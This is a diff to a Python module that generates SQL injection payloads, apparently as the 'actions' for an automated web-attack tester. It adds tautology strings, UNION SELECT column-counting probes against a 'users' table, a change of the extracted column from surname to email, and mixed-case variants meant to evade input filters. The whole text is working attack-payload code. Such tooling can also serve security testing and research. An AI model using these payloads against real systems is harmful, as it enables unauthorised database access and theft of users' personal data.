@@ -23,9 +23,12 @@ def generate_actions(escapes = None, max_columns = 3):
         x = "{0} or {0}1{0}={0}2{0}".format(esc) + ("#" if esc == "" else "-- ")
         actions.append(x)
 
+        x = "{0} or {0}1{0}={0}2{0}".format(esc) + ("#" if esc == "" else "--' ")
+        actions.append(x)
+
         columns = "1"
         for i in range(2, max_columns + 2):
-            x = "{0} union select {1}".format(esc, columns) + ("#" if esc == "" else "-- ")
+            x = "{0} union select {1}".format(esc, columns) + ("#" if esc == "" else "--' ")
             actions.append(x)
 
             columns = columns + "," + str(i)
@@ -36,14 +39,17 @@ def generate_actions(escapes = None, max_columns = 3):
         x = "{0} or {0}1{0}={0}1{0}".format(esc) + ("#" if esc == "" else "-- ")
         actions.append(x)
 
+        x = "{0} or {0}1{0}={0}1{0}".format(esc) + ("#" if esc == "" else "--' ")
+        actions.append(x)
+
         #To detect the number of columns and the required offset
         #Assumes knowlegde about table name and column name
-        columns = "surname"
+        columns = "email"
         for i in range(2, max_columns + 2):
-            x = "{0} union select {1} FROM users".format(esc, columns) + ("#" if esc == "" else "-- ")
+            x = "{0} union select {1} FROM users".format(esc, columns) + ("#" if esc == "" else "--' ")
             actions.append(x)
 
-            columns = columns + "," + "surname"
+            columns = columns + "," + "email"
     print(actions);
     return actions
 
@@ -63,7 +69,12 @@ def generate_actions_input_filter(escapes = None, max_columns = 3):
         actions.append(x)
         x = "{0} or {0}1{0}={0}2{0}".format(esc) + ("#" if esc == "" else "-- ")
         actions.append(x)
-        x = "{0} oR {0}1{0}={0}2{0}".format(esc) + ("#" if esc == "" else "-- ")
+        x = "{0} oR {0}1{0}={0}2{0}".format(esc) + ("#" if esc == "" else "--")
+        actions.append(x)
+
+        x = "{0} or {0}1{0}={0}2{0}".format(esc) + ("#" if esc == "" else "--' ")
+        actions.append(x)
+        x = "{0} oR {0}1{0}={0}2{0}".format(esc) + ("#" if esc == "" else "--' ")
         actions.append(x)
 
         columns = "1"
@@ -75,6 +86,14 @@ def generate_actions_input_filter(escapes = None, max_columns = 3):
             actions.append(x)
             x = "{0} union sElEct {1}".format(esc, columns) + ("#" if esc == "" else "-- ")
             actions.append(x)
+
+            x = "{0} union select {1}".format(esc, columns) + ("#" if esc == "" else "--' ")
+            actions.append(x)
+            x = "{0} uNiOn select {1}".format(esc, columns) + ("#" if esc == "" else "--' ")
+            actions.append(x)
+            x = "{0} union sElEct {1}".format(esc, columns) + ("#" if esc == "" else "--' ")
+            actions.append(x)
+
             columns = columns + "," + str(i)
 
     for esc in escapes:
@@ -86,9 +105,17 @@ def generate_actions_input_filter(escapes = None, max_columns = 3):
         actions.append(x)
         x = "{0} or {0}2{0}={0}2{0}".format(esc) + ("#" if esc == "" else "-- ")
         actions.append(x)
+
+        x = "{0} or {0}1{0}={0}1{0}".format(esc) + ("#" if esc == "" else "--' ")
+
+        actions.append(x)
+        x = "{0} oR {0}1{0}={0}1{0}".format(esc) + ("#" if esc == "" else "--' ")
+        actions.append(x)
+        x = "{0} or {0}2{0}={0}2{0}".format(esc) + ("#" if esc == "" else "--' ")
+        actions.append(x)
         #To detect the number of columns and the required offset
         #Assumes knowlegde about table name and column name
-        columns = "surname"
+        columns = "email"
         for i in range(2, max_columns + 2):
             x = "{0} union select {1} from users".format(esc, columns) + ("#" if esc == "" else "-- ")
             actions.append(x)
@@ -96,7 +123,14 @@ def generate_actions_input_filter(escapes = None, max_columns = 3):
             actions.append(x)
             x = "{0} union sElEct {1} from users".format(esc, columns) + ("#" if esc == "" else "-- ")
             actions.append(x)
-        columns = columns + "," + "surname"
+
+            x = "{0} union select {1} from users".format(esc, columns) + ("#" if esc == "" else "--' ")
+            actions.append(x)
+            x = "{0} uNiOn select {1} from users".format(esc, columns) + ("#" if esc == "" else "--' ")
+            actions.append(x)
+            x = "{0} union sElEct {1} from users".format(esc, columns) + ("#" if esc == "" else "--' ")
+            actions.append(x)
+        columns = columns + "," + "email"
 
     return actions
 
